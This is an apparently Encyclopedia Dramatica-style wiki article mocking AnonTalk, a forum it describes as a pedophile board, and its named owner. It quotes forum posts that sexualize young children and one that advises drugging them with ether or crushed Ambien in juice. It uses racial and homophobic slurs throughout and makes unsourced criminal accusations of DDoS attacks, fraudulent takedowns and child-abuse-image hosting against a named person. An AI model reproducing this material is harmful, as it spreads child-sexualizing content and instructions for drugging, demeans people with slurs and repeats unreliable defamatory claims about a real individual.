{{infobox Company|company_name="AnonTalk"|company_logo=[[File:Pedobear_small.gif]]|company_type="Anonymous" Textboard with forced IDs|foundation=05-Feb-08|location=[[Sweden]]|key_people=[[Kimmo Johan Alm]], [[Chris Hansen]]|motto=[[1984|War is peace<br/>Freedom is slavery<br/>Ignorance is strength<br/>Censorship is free speech]]|industry=Allowing pedophiles to talk about shit without being [[v&]]|products=Spam, [[CP|child pornography]]|homepage=[http://hiderefer.com/?http://www.anontalk.se www.anontalk.se]}}

'''AnonTalk''' (aka. '''PedoTalk''' or '''AnT''') is an illegal unauthorized clone of [http://www.tinychan.org/ Tinychan], a bulletin board. AnT is inhabited entirely by [[pedo|pedophiles]] and [[Love Shy|love shys]], where mainly [http://hiderefer.com/?http://www.anontalk.se/hot_topics topics] such as "Sexy 2 year old Emily dancing,"  "This is how I want my future toddler girlfriend to look," "How do I perform oral sex on my ten year old boyfriend," and "[http://hiderefer.com/?http://www.anontalk.se/topic/35905 I want oral sex from a 12 year old girl so badly]" are discussed.

Its owner, [[Kimmo Johan Alm]], is a miracle-worker: he somehow manages to be a bigger failure at life than [[Chris-chan]]. For example, he has a unique way of begging for donations, which involves constantly insulting and degrading his userbase.  He then wonders why nobody ever donates and why his co-moderators regularly turn against him. Kimmo loves to put the board in lockdown mode, preventing anyone from posting, then send his users derogatory PMs about how badly they fail for not keeping the forum fresh.

AnonTalk is famous on [[the chans]] and [[Wikipedia]] for delivering huge amounts of [[spam]] on these websites, since [[sickfuck|most of the visitors of the chans]] and [[Wikipedophile|of Wikipedia]] have the potential to become [[pedo|AnonTalk regulars]].  Every single person who knows about the site has learned of it through spam (even you, whether you know it or not).  Endless spam pours out advertising AnonTalk as a free speech zone when AnonTalk has the least free speech of any forum on the internets. The only free speech the site allows is as a practical how-to guide for child molestation. For everything that's not about that, Kimmo bans everyone nonstop purely for his own entertainment. So, naturally, whenever his website is banned by something, he completely loses his mind.

But it gets far worse, my friends...

{{quote|I simply cannot kill my own child, so I will continue running AnonTalk BBS even without the domain.

I have removed most instances of references to ".com" around the site and will update any remaining ones later. Proxy hosts continue to work for now.| Everyone's favourate Sweedish Pedo}}

Kimmo makes a dozen bulletins a day such as, "IT'S FUCKING DEAD HERE AND NOBODY SEEMS TO GIVE A SHIT. WHY THE HELL ARE YOU NOT DOING ANYTHING TO HELP?! DO YOU REALLY NOT GIVE A SHIT ABOUT THE BEST SITE ON THE INTERNET DYING."

The reason for his lack of traffic is that: 23 hours a day his site is in "lockdown mode" so only those with high post counts can post.  Plus, every thread is locked so only people with an even higher post count can reply to it.  Creating a new thread is also impossible without waiting a very long time to post. Plus, trying to post means getting past a [[CAPTCHA]] and wordfilters that instantly IP ban people for everything, even saying the site's URL.  And contacting Kimmo is impossible without a high post count.  Anyone even trying to figure out how to post on his site will eventually try doing a test post, which will also fail to post because it's in "lockdown mode" and Kimmo reads the logs of every attempted post and message sent to preview on his site and five minutes later he will manually ban your IP permanently because you tried to make a test post, even though it never posted.  And anything that actually can get posted that's neither pedo content nor created by Kimmo, he will delete it and ban the poster's IP forever.

==How it began==
[[File:pedotalk haiti.jpg|thumb|More important than a 100,000 dead Haitians.]]
[[File:Anontalkb&.png|thumb|right|HOLY CRAP YOU GET B& FOR ANYTHING!]]
Around summer 2006, [[4chan]] banned [[raid]]s and [[lolicon]] for [[legal]] reasons. Those who still wanted it went to places like [[7chan]].  In January 2007, after [[Kimmo]] got banned for posting lolicon a lot, [[Kimmo Alm Emails|he emailed moot]] the question:

{{quote|Why bully loli? Why do you bully loli?|"Kimmo Alm" <kimmoa@gmail.com>}}

[[moot]] never answered.  So Kimmo thought, "I'll create the most horrible [[anonymous]] BBS ever and everybody will love me.  I mean, who are the mods to cooperate with the [[FBI|law]] and try to keep their site from getting taken down?"  And thus, AnonTalk was born.

==How to tell when "Sysop" (Kimmo) posts [[anonymous]]ly==
[[File:Kimmosamefaggingitup.PNG|thumb|Kimmo samefagging it all up.]]
Every few topics start with the extremely annoying phrase "what grinds my gears".  Most of these topics are created by Kimmo, but then so are pretty much all topics on AnonTalk that avoid getting deleted.  Anyway, one example is, [http://hiderefer.com/?http://www.anontalk.se/topic/23705 Topic: What really grinds my gears: Random Capitalization]; [[nobody cares|no one except Kimmo cares about this]] and Kimmo is obsessed with it.  If you're smart, you'll notice all the replies to the topic are him [[samefag]]ging, too.  Whenever Kimmo deletes a post for a typo in it, Kimmo will make a topic starting with this phrase and if the victim apologizes to Kimmo in it, Kimmo will delete their public apology thinking that nobody knows he's the one who posted that topic.

Kimmo also regularly posts requests for help with his anger and if you read any of his bulletins, you know he's got anger issues. In [http://hiderefer.com/?http://www.anontalk.se/topic/47495 this topic], we learn that he regularly smashes holes in his walls and destroys his possessions over simple things like not being able to find an avi to mp4 converter to watch movies on his [[an hero|ipod]].

Most of the "random pedophilia" such as "''I fantasize about living on the moon with a little girl''", "''This is how I want my future little girlfriend to look when we walk in the fields of gold. I'll promise to keep the darkness out. She'll promise to keep night at bay''", and "''Lovely video: 9 year-old Nabokovian [[loli|nymphet]] dancing''" are him as well. He also often rips stories directly from [[Digg]] when he thinks that the site is too quiet.  As of late, when it's quiet, he'll also post a thread as [[anonymous]] encouraging people to donate, and the stats on his site show only one donation over the past three months, which is of course because whenever someone is convinced to donate, he unconvinces them before they can by being such an asshole.

He also posts anonymously on the Bulletins section.

==Kimmo's shit list==
Over the years Kimmo has acquired a [http://at-proxy.kimmoa.se/unserious_fraud_scam_companies_and_services huge list of people] whom have denied him service on the grounds that he's a disgusting paedophile. Let's share some of the highlights:

<div style="width:640px;margin:0 auto;">
{{frame|{{morphquote|mqtest3|background-color: #c4ddec;|font-weight: bold;
|Made a promise beforehand that there would be "no problems" hosting AT. Once a payment was made, it took them only days to send a "pack up and leave" letter because of "pedophile site". Talking to the admin, it became apparent that he is a deeply religious nutjob who refused to refund my money and instead gave it to his local church as a donation. Oh, and they managed to fuck up twice before they correctly installed the server. Extremely incompetent. The only reason I selected them was that they offered DDoS protection for a relatively very small amount of money.|Props to [http://www.sharktech.net SharkTech] for not tolerating Kimmo's shit.
|I had never used these services in the past but when I signed up and tried to add this domain, they both gave errors about it being banned. Unbelievable? You better believe it. Seems like some fucking moron has added the best site on the Web to some sort of blacklist.|Kimmo, on blacklisting the [[best|worst]] website!
|While their interface was completely retarded, that's hardly the biggest problem. A few days after setting things up, visitors dropped drastically to near-zero. I wondered what the hell was going on since the server was not under attack. Tried to log in to the account but instead of letting me in, it gave this message: "Account suspend[...]Reason: Abuse reported: there has been multiple messages linking to images of underage girls exposing themselves, posted on anontalk.com". OK. What? You ban customers without investigating AND don't even let them know? No sane person would use that service after reading this|I'm guessing this is why Kimmo was using this service.
|(Second-hand experience.) These iDiotz quickly removed the whois privacy, then started making threats without investigating the fake abuse reports with drivel about "child porn" (which has never, is not and will never be hosted here). Yet another crappy company.|Kimmo, on lying his fucking teeth out
|Quietly censored away this domain, actually hosting a message claiming that it is "illegal", shown to all visitors. Never notified me about any of this. Had to find out via a user who reported it. At this point, I didn't bother to even ask about what the fuck they were doing since nobody ever responds to my e-mails. Avoid these complete retards.|Apparently [[child porn]] isn't illegal.
|Looking up what other controversial sites use, I found that Annabelleigh.net uses Moniker for domain privacy and apparently has been for quite a while. So I switched to them. Of course, after paying, it took them only a couple of days to REMOVE THE WHOIS PRIVACY AND EXPOSE THE PERSONAL INFO TO THE WORLD, simply "letting me know" about this, stating no reason. None of my many e-mails asking them why they were doing this were replied to. All I got back was: "This matter is closed. Thank you." and then complete silence. I also asked them why they allow that other site still, and I also asked the owner of that domain, but no replies were given. This is just unbelievable.|UNBELIEVABLE
|First time: Out of the blue, I get the "classic" letter about being suspended, this time actually providing a reason: I had entered "false" whois data. Except that is a lie; I had used correct info. Since they didn't give any details, the only part that I can think of that would be "false" is the telephone number, since I don't own a phone. I believe I entered "123456" since it wouldn't let me through unless I entered some number.|Kimmo, on not understanding what "false" is.
|Actually immediately offered to sponsor AT when I asked them about their services and prices, calling it an "interesting project". After a few days, the server stopped responding. They had silently killed the service without telling me. I had to actively contact them to find out that they had done this "because of pedo site". They don't offer true tunnels but instead use unencrypted Web proxies. Barely know English. Stay the hell away from these morons.|Even the [[Switzerland|Swiss]] hate Kimmo.

==About the site's forum regulars==

AnonTalk's forum regulars are a bunch of people almost as despicable as Kimmo Johan Alm himself.  Firstly, there's Kimmo Johan Alm with his sadistic, moody petty whims that are pure nonsense but any regular must abide by them like Kimmo is [[GodJesus]] himself and also perform the equivalent of digital analingus on him.  Now a normal person would go into a [[rage]] over this alone, but the regulars not only are fine with it, they have all developed [http://en.wikipedia.org/wiki/Stockholm_syndrome Stockholm syndrome] and think that Kimmo's sick insanities are normal.

And that's not all.  Any pics of someone whose age is more than one digit incurs the wrath of the regulars and then a banning.  For instance when someone links to media of [[Zoe Kimball]] when she was 14 at the time, the forum regulars are all "Alright, damn, that's not a loli, that's a granny." and "You have failed us anon. Die in hell."

===AnonTalk is not actually anonymous===

On AnonTalk, you must use the same user ID for every single one of your posts. When AnonTalk's server is seized, all the police have to do is check the logs for AnonTalk and find your IP address to match your poster ID. Then once they seize your computer and find your ID & password stored on there they will have enough evidence to prove in court that you made all of the posts under that user ID. '''AnonTalk's server logs are insecurely deleted every one month. Meaning that if you visit AnonTalk more than once a month, your IP address is always stored on the server.''' The white-listing feature on AnonTalk is useless, as after you have been white-listed your original IP address is stored in case you abuse the privilege.

Regular AnonTalk users are deluded by Sysop into thinking they have any anonymity whatsoever, when in reality they are just being manipulated into becoming grammar Nazis by a fat ugly pedophile.

==AnonTalk's memes==
[[File:Unmade-Fucking Idiot.png|thumb|100px|Fucking idiot]]
[[File:Kimmo Un fucking believable.png|thumb|100px|Un-fucking-believable]]
[[File:Kimmo lovely woods.jpg|thumb|Kimmo is the lovely woods guy. His home is right by the woods and an elementary school.]]
;"Fucking idiots" and "Un-fucking-believable": Will have random bold, italics, [[ALL CAPS]], and varying exclamation points. This is a meme that came about by mocking how Kimmo always uses this in his bulletins, though Kimmo uses these phrases everywhere, even in private messages to his moderators. These are mostly found on clone sites.
;[[You sir, are an idiot]]: Kimmo goes on 4chan and says this in every post he makes that's not a direct spam for his website.
;What grinds my gears/What X my Y: Retarded meme constantly on AnonTalk that has spilled over onto the clone sites.
;Ask an X anything: AnonTalk has nonstop posts of this nature. This meme has spilled out as a cancer of the chans. At one point Kimmo even tried to ban it on his site but he overturned it because it made his site's traffic decrease by 90%.
;The lovely woods: For about a year, AnonTalk had someone posting ceaseless bad poetry by some pedophile about wanting to take children to the "lovely woods" for romance.
;Cuntbots: A name for a bot that is designed to [[rape]] Kimmo's [[shit|best]] site [[lies|on the internet]]. He [[INAM|invents this meme]] in [http://bulletins.iwantabro.com/bulletin/2056 this bulletin].

[[File:Anontalkwtfsrsly.jpg|thumb|Like, wtf, srsly.]]
AnonTalk is a BBS that says it has anonymity even though there's an ID system which is just forced tripfaggotry. It's like wearing a mask, going up to a person, yelling your full name as loud as possible, and then saying "I'm anonymous, though! LOL!"

Its content is mostly centered around pedophiles talking to other pedophiles.  It's full of lulzy topics like, "[http://hiderefer.com/?http://www.anontalk.se/topic/25102 How can I get a hug from a little boy?]"  It has such posts as [http://hiderefer.com/?http://www.anontalk.se/topic/5074 how somebody met a woman and then met a jailbait and asks the Internet who to date] with amazing answers such as:

{{quote|Easy decision. What matters more to you, personality or tits? Are you looking for a possible relationship (jailbait) or a fuck toy (tits)? Would you rather be the teacher (innocent little jailbait) or the student (experienced girl (whore) with big tits)? I'm admittedly biased, but to me the answer is obvious.|Anonymous 483f3ac9a28b96.78845000|on how ten year olds have a lot of personality}}

Most content is mixed between pedophilia, loli discussion and more pedophilia. If you ever see content that is not pedophilia, 100% of it is Kimmo Johan Alm using multiple IDs to talk to himself--if you point this out your post will be deleted and you will be banned.

Here are some wonderful quotes showing how much better AnonTalk is than 4chan or any other inane message board:

{{quote|Right after the lolis (and shotas, regrettably) had been swimming, it was my (and all other disgusting grown-ups') turn to swim. There was a bunch of lolis on the outside who stood at the glass wall (at a door) and looked in at something for a really long time. It felt sort of awkward to be looked at while trying to swim like a pro. I bet the lolis wanted me to go out and play with them and let them ride on my back and have them sit in my lap and use my head as a pillow for their soft little bums. Or maybe they wanted to be with me in there in the water… The water smells special after a bunch of lolis have bathed in it. Almost like a sacred liquid.|Anonymous 47ae211000a6a8.34833955|[http://hiderefer.com/?http://www.anontalk.se/topic/5037 on how he's fucking insane]}}

{{quote|I saw a little girl outdoors: She had pigtails and was walking around, looking behind her and up to the buildings or the sky. She looked confused and worried. Maybe she wanted me to save her from her terrible life and for us two to live together…|Anonymous 47ae211000a6a8.34833955|[http://hiderefer.com/?http://www.anontalk.se/topic/4932 knows exactly what girls are thinking]}}

{{quote|Ether works great.  Aqua-dots used to work better.  Crush up Ambiens and inject into juice containers for best results.|Anonymous 47ae211000a6a8.34833955|[http://hiderefer.com/?http://www.anontalk.se/topic/5038 Do-It-Yourself and stop asking for CP]}}

In addition, it also contains lots of fun polls where you can see the results to discover that a significant portion of the users have raped children, a significant porition of the users who are parents have molested their own children, etc.

==It does contain CP==
[[File:Anonpedofags.jpg|thumb|right|Business as usual on AnonTalk.]]
[[File:Anontalkmindfuck.png|thumb|right|A spelling error on Anontalk?! Surely Sysop wouldn't do such a thing himself, right? ...Right?!]]
Despite its Sysop Kimmo reading every single post and deleting 99.9999% of them, he allows people to use his ImageShack wrapper to upload CP to ImageShack and then link it on the site.  An example is [http://hiderefer.com/?http://www.anontalk.se/topic/23895 this thread] that's been around for several weeks. While Kimmo instantly deletes any replies saying "stop posting CP" or "OMG someone posted CP," he leaves up the threads with CP forever. (Imageshack did of course eventually delete the CP but not Kimmo.)

==AnonTalk's "free speech" claims==
Kimmo and his pedosheep spread the big lie that AnonTalk is a free speech site.  Anyone who even hints on their forum that it's not a free speech site will get banned and their IP address redirected to [[Last Measure]].

AnonTalk's [http://hiderefer.com/??http://www.anontalk.se/FAQ FAQ] unintentionally gave quotes of how AnonTalk actually is:
* ''"All the countless inane technical and usability issues aside, they randomly censor "controversial" posts and ban people "for fun"."''
*''"All these fucking high-on-power hypocrites (commonly known as "modfags"), preaching their pseudo-moralistic values and shoving their random rules down our throats."''

Kimmo is so insane that if you make a post with an opinion different from him or something he wants to keep secret on his website and send it to show preview and never post it, if he's online, he will read everything sent to show preview and within minutes he will ban your IP from the site, purely out of a crazed sadistic stalker nature.  [[Irony|He will then of course go around screaming about how his site has no traffic and how the internet is working to silence his "free speech website".]]

His site has a million [[wordfilter|word-filter]]s and all of them are [[stupid]].  All intelligent discussion is banned.  Furthermore, if Kimmo has spammed a website, then any word related to it also is blocked.  Pretty much the entire internet is blocked.

Kimmo and his regulars, of course, are always on a mission to lure young children to the forum so they can be lured to a pedophile's basement.  However, every child that has come has been banned automatically by the site's software for failing to have 100% perfect grammar and spelling.  This has been mentioned to Kimmo who has promptly ignored it and banned those who mentioned it.

AnoNtalk's FAQ does clarify the "free speech" that it allows:
*''"What I mean by "uncensored" is that, for example, "[[child molester|little girl lover]]" discussions are allowed"''  Kimmo originally had this quote in there boasting that his site is for pedophiles.  After having his website banned by every registrar, he has later edited this down and tried to deny his site was a pedophile site.

Basically, you can discuss raping your 3 year old granddaughter, [http://www.anontalk.se/topic/33940 raping your toddler], and exchanging links on where to find [[CP]].  For everything else, it's actually easier to get your message on national TV than to get it to stay on AnonTalk for an hour.  The only thing people are allowed to say is content in 100% support of pedophilia.  That is all.  If people say anything else, Kimmo and his mods will delete it.  Any messages that remain there that are exceptions are posted by either Kimmo or his mods.

The whole pickiness on spelling and grammar is a complete lie.  They only exist so Kimmo has an excuse as to why he deletes a post.  Fact is that all threads that are pro-pedophile can written in the style of [[JeffK]] and they're just fine with them.  For example, [[:File:Anontalk grammar rules dont apply to pedophiles.png|topic 14634]] has been up for over 11 months.

In reality, Kimmo neither cares about spelling/grammar nor is good at it.  His bulletins are chock full of grammar errors like, ''"Due to the fact that <u>nobody ever better themselves</u>, this board no longer has a concept of temporary ID bans — they are all permanent."''

Here's a typical bulletin from Kimmo complaining about grammar and spelling, but now with proofreading marks:
[[File:Kimmo-bulletin-with-proofreading-marks.png|600px]]

AnonTalk also auto-bans people for typing in [[ALL CAPS]] when most of Kimmo's bulletins are just that.  What's more, Kimmo did an angry bulletin once full of his signature phrases ''UN-FUCKING-BELIEVABLE!'' and ''FUCKING IDIOTS!'' saying he'll ban anyone who starts a sentence with "And", saying it's incorrect grammar, yet all the while, he'll regularly start his own sentences with "And" even on his baywords downtime status site, totally forgetting what he just said.

You will also get your IP address banned and redirected to [[Last Measure]] if you do anything such as: voting on a poll in a way that Kimmo doesn't like, entering "kimmo" into his magic 8ball bot "The Oracle" that doesn't post anything to the forum or entering "kimmo" anywhere on the site, etc.

In addition, if you [[hax|evade]] your Anontalk bans, Kimmo will have you banned from the [[internets]]:

{{quote|Repeatedly bypassing bans here will cause you to get abuse [[unwarranted self importance|reported to your Internet service provider]] and [[unrealistic expectations|permanently cut off from the entire Internet]].|[http://www.anontalk.se/shitlisted]}}

Even when /b/ goes down and no one can post, this bot is still able to post somehow. Spooky.  AnonTalk even has a thread surveying the site [http://hiderefer.com/?http://www.anontalk.se/topic/15788] and everyone there found the site through spam on various chans.

===AnonTalk takes it too far===
Long ago AnonTalk [[spambot]]s started spamming /b/ with things other than advertisements for their site, like the phrases [[True|"you are and idiot"]] and [[Some argue|"I noticed"]]. This was made in attempt to retaliate against 4chan trolls posting on their site. 4chan, fed up with AnonTalk's high stupidity levels took action against their site, in the form of synfloods, DDoS attacks, and several hacking attempts.

It should also be noted that Sysop, due to immense amounts of butthurt, has decided to bring [[Last Measure|illegal malware]] back onto the site in an attempt to stop "trolls" from "spamming". Anyone attempting to spam the site or even visit it should take caution. If you plan on reporting AnonTalk to its ISP, mention the site's use of malware.

===Anontalk takes it too far part deux (march 2010) ===

[[Kimmo]], while  having a life mostly consisting of [[fail]], actually managed to make some [[win]] on teh internets with his autistic compulsive superpowers (of course, ONLY on teh internets will he ever be able make win). <br>
He succeeded to troll [[Moot]] [[batshit]] crazy with his epic spamflood which has been going on for [[over 9000]] years now. 

On 10 march 2010, in utter desperation, Moot posted the following message in the top of all boards on 4chan: 
[[File:MootVsAnontalk.gif|center|frame|{{main|Kimmo Alm Emails|}}]]

Obviously, the posting of this message resulted in Anontalk being [[DDos|gangbanged]] by Anonymous for the over 9000th time, as can be seen by the following message on [http://anontalk.baywords.com/2010/03/20/new-server-needed/ the Anontalk status page] on march 20:

{{quote|
I’ve tried everything, but the old server is just too weak. Since you never donate, I have tried countless things to optimize everything, but it’s simply not got the power needed. Right now, it’s being maintained, which takes forever. | Anontalk getting [[pwned]] again
}}

But, as always, Anontalk survived the raep and a couple of weeks later [[moot]] removed his desperate outcry despite the spam still being epic in proportions. Result: [[fail|Anontalk gained huge exposure on 4chan for free]]. Kimmo couldn't have hoped for better publicity in his wildest wet pedophilic dreams. However, [[some argue]] that this epic war is not over yet as Kimmo is still an annoying spamming faggot, [[Moot]] is still hosting its version of tinychan and Anonymous has since stepped up and devised a much better strategy for raeping Kimmo (see [[Anontalk#March 2010: Kimmotherapy| Operation Kimmotherapy]] for more information).

this will be continued for sure nigger...



Every autistic fucknut can be proud of Kimmo for being the first annoying faggot to put his dick in [[Moot]]'s ass so deep, he got a personal front page message on 4chan. Only the true cancers of /b/ will ever reach 
these levels of epicness.  

So if you also want to get your personal message on 4chan and become epic just do the following:

1. Have no life (don't worry, you already have this one) <br>
2. Jack off to CP sometimes <br>
3. Create a pedo discussion board<br>
4. Spam 4chan incessantly for a couple of years<br>
5. Annoy everyone<br>
6. Just keep going on<br>
7. ???<br>
8. Profit<br>

==Sysop spams TOW constantly==
The sysop of AnonTalk, under the impression that [[wikipedophile|Wikipedia is full of pedophiles]], lets his [[spambot]] loose there. Of course, too lazy to write a proper spambot that inserts links into all articles, he just had a bot that pretended [[TOW]] was a message board and his bot did to TOW [[rape|what he does to 3-year-old boys]].  So Wikipedia did this http://www.archivum.info/wikibugs-l@lists.wikimedia.org/2008-06/msg00904.html

[[Butthurt]], Sysop posted anonymously pretending to be some innocent third party with a fake story:

{{quote3|

I repeatedly tried to add AnonTalk as an article, with a well written text about the site, but within seconds some fucking faggot inserted a "tag" which "speedily deletes" it and posts a lot of pre-written drivel on my user page. Now the article is blocked from being created at all.

Don't bother wasting your time contributing to that shitty site — your edits will just get reverted instantly by the 16-year-old mods who sit on huge butt plugs and fap to their powers as they destroy your work and ban you. Same story as always…
}}

[http://hiderefer.com/?http://www.anontalk.se/topic/6560 The thread] is full of deleted posts and bannings from people who constantly ask whether the sysop started the thread and if he was there spamming.

An example spam is [http://en.wikipedia.org/w/index.php?title=Until_It_Sleeps&diff=309547517&oldid=302449429 this unsneaky spam.]  [[Kimmo]] often hits the same article over and over; see [http://en.wikipedia.org/w/index.php?title=Until_It_Sleeps&action=history the history of "Until It Sleeps"]; now he's spamming the link of 4chan [http://en.wikipedia.org/w/index.php?title=Until_It_Sleeps&oldid=349198890 in the same article, big surprise.]

Kimmo's spam of Wikipedia is so bad that Wikipedia's [[Abuse Filter]] even has '''four''' of them for AnonTalk, [http://en.wikipedia.org/wiki/Special:AbuseFilter #7], [http://en.wikipedia.org/w/index.php?title=Special:AbuseFilter&offset=215 #215, #228, and #230]. You can even see the spam flooding in here with [http://en.wikipedia.org/wiki/Special:AbuseLog?wpSearchFilter=7 #7], [http://en.wikipedia.org/wiki/Special:AbuseLog?wpSearchFilter=215 #215], [http://en.wikipedia.org/wiki/Special:AbuseLog?wpSearchFilter=228 #228], and [http://en.wikipedia.org/wiki/Special:AbuseLog?wpSearchFilter=230 #230].

To top it off, many bots copy Wikipedia articles and sections of them verbatim without reading them.  Occasionally, this will happen while AnonTalk spam is still on a Wikipedia article.  This has resulted in AnonTalk's spam spreading far and wide everywhere!

==Spamming ED==
Sysop regularly creates junk usernames and spams ED, too [http://www.encyclopediadramatica.com/index.php?title=Team_Fortress_2&diff=prev&oldid=1997845923 (example)].  But that's not so much news since, basically, the sysop of AnonTalk spams everywhere.  If you want proof, then start a topic on his site about it and watch it get deleted and you banned.

==The cunt spams Fucked Company==
AnonTalk is a clone of the software [[Wikipedia:UBB.classic|UBB.classic]], first created in 1996, which had all the features of AnonTalk but with more advanced features.  [[Fucked Company]] forums ran a modified version of that software since the 1990s and Kimmo decided to copy it.

After Kimmo cloned their forums, he spammed and DDoSed the site until it finally shut down so that he could claim his forum idea was original.

Here's [http://f2bbs.com/bbs one BBS using that old software.]  anonboard.com is the same site, but a different URL going to the same exact site.

==Kimmo secretly doesn't want users spreading the word==
In every other bulletin posted by Kimmo, he complains that nobody is spreading the word, but wait--yes they have been!

;[[YouTube]]: <s>[http://www.youtube.com/watch?v=o-t-2nqFTp4 This video]</s> (DMCA'd by [[TehBigToaster]]) is where Kimmo is compared to a powerful national leader. [http://www.youtube.com/watch?v=8HNoLlIcFAw This vlog] tries to put a positive spin on AnonTalk's pedophilia topics by claiming it only has them about post-pubescent minors, when its entire userbase only desires children still in diapers.  <s>[http://www.youtube.com/watch?v=FBgIeNYIttI And this video]</s> (now removed due to TOS) said that, "AnonTalk is the fucking greatest site ever made."  Srsly.  <s>[http://www.youtube.com/watch?v=R6xPKzrQZeY This video]</s> (DMCA'd by [[TehBigToaster]]) even specifically asks users to spread the word of AnonTalk, just like Kimmo wants.  Its exact words were, "Keep spreading the word of this sick site!  We have to get anontalk.com taken down!" <s>[http://www.youtube.com/watch?v=pV0nevMA49g Another video.]</s>

;[[Encyclopedia Dramatica]]: Aside from this article and mentioned in other articles, ED has had comics about AnonTalk as [[Encyclopedia Dramatica:Picture of the Now|pictures of the now]], linked a video about AnonTalk as [[Encyclopedia Dramatica:Video of the Now|video of the now]], and its [[Encyclopedia Dramatica:Quote of the Now|quotes of the now]] during October 26th through November 14th all originate from PedoTalk.

;[[Oprah Winfrey]]'s forums: "Hello everybody. I come to your attention because I need to <u>spread the word about this.</u>" And then the user describes AnonTalk. http://www.oprah.com/community/thread/123815

Does Kimberly appreciate this?  Hell no!  In fact, he hates it to the point in which he will ban you for even mentioning it on his site.

On top of that, Kimmo will not release the software to his spambots so that his forum [[sheeple]] can spread the word in the same spam-tastic way that he does.

==AnonTalk ads==

On July 2, Kimmo published a bunch of [[Image macro|posters]] in [[bullshit|PDF format]] on the [http://hiderefer.com/http://www.anontalk.se/save_AT /save_AT] page. If you ever encounter one of these posters [[IRL|in real life]], make sure to contact your [[Partyvan|local police station]] immediately, most likely there's a [[Pedophile|child molester]] living nearby. Be sure to point out that AnonTalk is a pedophile site and display evidence of this.

However, Anonymous soon abused this as well. A guy named "ltamake" added a "poster" that actually had a copy of ATBBS hidden inside of it (original can be seen [http://www.alltalk.in/topic/81 here]). Kimmo raged, deleted the image, and posted a bulletin about it. After that, he stopped accepting posters.

=AnonTalk's attempts to destroy other websites=

==Kimmo gets ISPs to block 4chan==
::''Main article: [[AT&T Blocks 4chan]]''

As the press such as [[Fox News]] [http://www.foxnews.com/story/0,2933,534941,00.html] have mentioned, Kimmo used IP address spoofing combined with [[DDoS]]ing and filing lots of false reports to cause major ISPs like [[AT&T]], Comcast, and Cogent Communications to block access to 4chan.

==Kimmo vs. Anothertalk.org==
Anothertalk.org was the first site made to clone Kimmo's software so the pedophiles would have a board to use without Kimmo running it. The site was made by a self-admitted pedophile called KawaiiKitsune. First hailed as a great place, the site itself degenerated into one day into nothing put 100% pure shitposts from rudefags with the same annoying exact some phrases posted over and over and over nonstop. The only other content was KawaiiKitsune bashing [[TehBigToaster]] and people complaining about the shitposts. Somehow Kimmo Johan Alm through DDoS, CP floods, fake abuse reports, spam, and all kind of attacks got the site's owner to chicken out and shut down the site. When it shut down, truly [[nothing of value was lost.]] But after that happened, the scum of that site went off to tinychan, took their cancer, and permanently crapflooded Tinychan with it.

==Kimmo vs [[Tinychan|Tinychan]]==
{{quote|You are still hosting the illegal clone "tinychan.org" of my Web site on your servers. Remove it immediately or I will sue you for $100,000/day. Respond to me ASAP.|Kimmo Alm|[[Kimmo Alm Emails|On being fucking crazy]]}}
[[File:Tinyhime_win.jpg|thumb|Tiny-hime fucks up Kimmo's shit]]
Jan Martin was one of the first [[moderator]]s ("wiseguys") of [[AnonTalk]] back in 2008. After being unmade as a wiseguy in 2009, Jan founded the first clone of AnonTalk and began spamming it on AnonTalk.  [[Lulz]] followed.

Take it down, kid, and do something original.

[[File:Kimmo alm struck tinychan Jan 2010.png|thumb|Tinychan shut down January 2010 due to DDoS.]]
Ever since then, AnonTalk and Tinychan have [[spam]]med and [[DDoS]]ed each other back and forth.  Eventually the DDoSing got Tinychan kicked off [[Dreamhost]], though Kimmo being the pathological liar he is claimed that it was all his complaints to Dreamhost that did it.  Then Tinychan moved to 4chan for extra lulz.

==Kimmo vs. the KKK==
In 2009, [[Krapple Komputer Kompany]] (KKK), a largely unknown site except for its subforum for [[Chris-chan]] fans/trolls (no difference really) was minding its own business when Kimmo's [[spambot]] came by August 2nd, 2009 and has spamflooded the site with CP and links to Anontalk.com nonstop since.  All was not lost, because the KKK now has a forum dedicated to fighting back against Kimmo: http://krapplekomputerkompany.com/fs/

Enraged by this [[9/11|Pearl Harbor]]-like attack on Anonymous, a joint strike force from Krapple Komputer Kompany and the /i/nsurgency set off to epic battle. KKK focused on legal measures to get Kimmo v&, while the /i/nsurgency did its usual shenanigans. Things got taken new a new level though when the spec/i/al forces noticed that kimmoa.se was hosted on the same server (prq.se) as Anontalk.com, and realized that SysOp of Anontalk was in fact notorious spammer and basement dweller Kimmo Johan Alm. Dox were obtained.

Thanks to a generous Anon on Krapple Komputer Kompany's /fs/, http://anøntalk.com will now redirect to: http://www.krapplekomputerkompany.com/fs/

Yet another generous anon has purchased http://www.anontalk.co.uk which redirects to '''''right here'''''

You can help by buying the domain: шшш.аиоитаㄥк.сом and redirecting it to anywhere you please.

Kimmo however continued to DDoS the site as well as CP flood it and then report it for CP.  Kimmo managed to get the account suspended from August 10, 2009 until August 19, 2009. KKK went offline seemingly for good on November 2, 2009 and the domain now points to Legi0n's version of /cwc/.

==Kimmo's fraudulent DMCAs on YouTube==
In March 2010, Kimmo has been filing fraudulent [[DMCA]]s for non-copyright violating YouTube videos about him or his website and he has been filing them under the name of one of his enemy, [[Jan Martin]]. [[TehBigToaster]] later claimed that he actually did this, but who the fuck knows?

He has hit every single video mentioning him or AnonTalk on YouTube.  A small selection of the biggest loses are: http://www.youtube.com/user/Anon5850 who has been posting a video of Anon visiting Kimmo's home.  He also took down the funny Hitler video http://www.youtube.com/watch?v=o-t-2nqFTp4 .  He has also been hitting http://www.youtube.com/user/Kakashi465 who has posted several rant videos against the pedophiles of anontalk.  Below are Kakashi465's responss:



<center>{{fv|rant|background-color: green;|font-weight: bold;|<youtube>kmzRVEa_QXY</youtube>|<youtube>LLI2-Raqq7I</youtube>|<youtube>25Mc5_Qsae4</youtube>|}}</center>

Update: Kimmo, in his usual style, has basically admitted to all the false DMCA claims.
[[File:Dmca_admission.png]]

===Impersonating Kimmo using his own tactic===
A couple of curious anons were wondering if Kimmo's DMCA tactic would work the other way round, so they reported an [[Sick fuck|innocent]] video titled "[http://www.youtube.com/watch?v=nZTqjnaLe2o The Pedophile Story]", claiming it was violating the DMCA. Within moments, the video was [[Baleet|baleeted]], ANT was blamed and many lulz were to be had.

The popular [http://www.youtube.com/watch?v=F8gji6hdN-c 4chan ftw] video with [[Over 9000|over a million]] views was also removed using the same tactic, thus proving that YouTube is utterly pathetic.

==Shitnami==

[[File:shitnami.png|200px|thumb|right|v0.2b screencap]] 
